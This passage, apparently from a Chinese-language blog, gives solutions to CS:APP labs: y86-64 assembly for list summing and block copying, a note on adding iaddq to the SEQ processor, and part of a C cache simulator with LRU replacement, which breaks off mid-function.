</blockquote>
<h4 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h4><p>根据<code>examples.c</code>给的三个函数，写出对应的<code>y86-64</code> 汇编代码。</p>
<blockquote>
<p>csapp p252 给了示例代码，模仿即可。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#sum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">	call main             # Execute main program</span><br><span class="line">	halt				  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">	.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq ele1, %rdi</span><br><span class="line">	call sum_list         # sum_list(list_ptr ls)</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">	xorq %rax, %rax       # val &#x3D; 0</span><br><span class="line">	jmp loop1             # goto loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">	mrmovq 0(%rdi),%rsi   # get ls-&gt;val</span><br><span class="line">	addq %rsi, %rax       # val +&#x3D; ls-&gt;val</span><br><span class="line">	mrmovq 8(%rdi),%rsi   # get ls-&gt;next</span><br><span class="line">	rrmovq %rsi,%rdi	  # ls &#x3D; ls-&gt;next</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">	andq %rdi, %rdi       # and $rdi</span><br><span class="line">	jne loop              # if !&#x3D; 0 goto loop</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">	call main             # Execute main program</span><br><span class="line">	halt				  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">	.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00</span><br><span class="line">	.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq ele1, %rdi</span><br><span class="line">	call rsum_list         # rsum_list(list_ptr ls)</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">	pushq %r12</span><br><span class="line">	xorq %rax, %rax        # val &#x3D; 0</span><br><span class="line">	andq %rdi, %rdi        </span><br><span class="line">	je return              # if &#x3D;&#x3D; 0 goto return</span><br><span class="line">	mrmovq 0(%rdi), %r12   # get ls-&gt;val</span><br><span class="line">	mrmovq 8(%rdi), %rdi   # get ls-&gt;next</span><br><span class="line">	call rsum_list         # call rsum_list</span><br><span class="line">	addq %r12, %rax        # val + rest</span><br><span class="line">return:</span><br><span class="line">	popq %r12</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">	call main             # Execute main program</span><br><span class="line">	halt				  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">	.align 8</span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111</span><br><span class="line">	.quad 0x222</span><br><span class="line">	.quad 0x333</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq src, %rdi</span><br><span class="line">	irmovq dest, %rsi</span><br><span class="line">	irmovq $3, %rdx</span><br><span class="line">	call copy_block         # copy_block(long *src, long *dest, long len)</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">	irmovq $1, %r13</span><br><span class="line">	irmovq $8, %r14</span><br><span class="line">	xorq %rax, %rax        # result &#x3D; 0</span><br><span class="line">	jmp loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">	mrmovq 0(%rdi), %r12</span><br><span class="line">	addq %r14, %rdi</span><br><span class="line">	rmmovq %r12, (%rsi)</span><br><span class="line">	addq %r14, %rsi</span><br><span class="line">	xorq %r12, %rax</span><br><span class="line">	subq %r13, %rdx</span><br><span class="line">loop1:</span><br><span class="line">	andq %rdx, %rdx</span><br><span class="line">	jg loop</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<h4 id="PartB"><a href="#PartB" class="headerlink" title="PartB"></a>PartB</h4><p>按照 <code>iaddq</code> 的属性在 <code>sim/seq/seq-full.hcl</code> 中特定的位置添加 “IIADDQ” 即可</p>
<h3 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h3><blockquote>
<p>推荐阅读：</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1rE41127Re?p=41">https://www.bilibili.com/video/BV1rE41127Re?p=41</a></p>
</blockquote>
<h4 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h4><p>在<code>csim.c</code>中写一个Cache，使用LRU替换策略。我们目的就是实现一个功能和<code>csim-ref</code>一样的程序。其实预至的<code>csim-ref</code>是没有脱符号表的…</p>
<p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200730141947.jpeg" alt="Cache结构"></p>
<blockquote>
<p>数据访问：</p>
<ul>
<li>L：Load，数据载入，可能发生1次miss</li>
<li>S：Store，可能发生1次miss</li>
<li>M：store后再load，两次访存。1 miss &amp; 1 hit + 可能eviction</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> valid_bit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tag;</span><br><span class="line">	<span class="keyword">int</span> LRU_count;</span><br><span class="line">&#125; Cache_line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	Cache_line* lines;</span><br><span class="line">&#125; Cache_set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> S;</span><br><span class="line">	<span class="keyword">int</span> E;</span><br><span class="line">	Cache_set* sets;</span><br><span class="line">&#125; Cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hit_count=<span class="number">0</span>, miss_count=<span class="number">0</span>,eviction_count=<span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	s -- the number of sets</span></span><br><span class="line"><span class="comment">	E -- the number of cache lines in one set</span></span><br><span class="line"><span class="comment">	b -- the size of one block in one cache line</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span></span>;  <span class="comment">//print the help messages</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span></span>; <span class="comment">//init caches</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span></span>; <span class="comment">//free caches</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if hit return the index of memory</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if there is any empty memort return it&#x27;s index</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//store</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//modify: once store and once load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> s, E, b;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];   <span class="comment">//store the name of the file</span></span><br><span class="line">	<span class="keyword">int</span> verbosity = <span class="number">0</span>;</span><br><span class="line">	Cache cache;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">while</span> ((ch = getopt(argc, argv, <span class="string">&quot;vs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">				verbosity = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">				s = atoi(optarg);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">				E = atoi(optarg);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">				b = atoi(optarg);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">				printUsage(argv);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">				<span class="built_in">strcpy</span>(buf, optarg);<span class="comment">//copy the address of trace to file</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( !s || !E || !b ) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, *argv);</span><br><span class="line">		printUsage(argv);</span><br><span class="line">	&#125;</span><br><span class="line">	initCache(s, E, b, &amp;cache);</span><br><span class="line">	replayTrace(s, E, b, buf, verbosity, &amp;cache);</span><br><span class="line">	freeCache(&amp;cache);</span><br><span class="line">	printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, *argv);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Options:&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  -h         Print this help message.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  -v         Optional verbose flag.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nExamples:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cache-&gt;S = <span class="built_in">pow</span>(<span class="number">2.0</span>, s); <span class="comment">// get the sets</span></span><br><span class="line">	cache-&gt;E = E;</span><br><span class="line">	cache-&gt;sets = (Cache_set*)<span class="built_in">malloc</span>(cache-&gt;S * <span class="keyword">sizeof</span>(Cache_set));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line">		cache-&gt;sets[i].lines = (Cache_line*)<span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(Cache_line));</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; cache-&gt;E; j++) </span><br><span class="line">		&#123;<span class="comment">//init every cache line</span></span><br><span class="line">			cache-&gt;sets[i].lines[j].valid_bit = <span class="number">0</span>;</span><br><span class="line">			cache-&gt;sets[i].lines[j].LRU_count = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line">		<span class="built_in">free</span>(cache-&gt;sets[i].lines); </span><br><span class="line">		cache-&gt;sets[i].lines = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">	cache-&gt;sets = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123; <span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">int</span> hitIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">1</span> &amp;&amp; cache-&gt;sets[setIndex].lines[i].tag == tag)&#123; <span class="comment">// valid and the tag matches</span></span><br><span class="line">            hitIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hitIndex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123;<span class="comment">//find whether there is an empty line in the given set</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> emptyIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">0</span>) &#123;</span><br><span class="line">            emptyIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> emptyIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> hitIndex = getHitIndex(cache, setIndex, tag);<span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">if</span> (hitIndex == <span class="number">-1</span>) &#123; <span class="comment">//one miss</span></span><br><span class="line">        miss_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">int</span> emptyIndex = getEmptyIndex(cache, setIndex, tag);     </span><br><span class="line">        <span class="keyword">if</span> (emptyIndex == <span class="number">-1</span>) &#123;<span class="comment">//need eviction </span></span><br><span class="line">            eviction_count++;</span><br><span class="line">            <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count == cache-&gt;E - <span class="number">1</span> &amp;&amp; flag==<span class="number">1</span>)&#123; <span class="comment">//find the least recent used line, and other line LRU_count++</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                &#125; </span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span 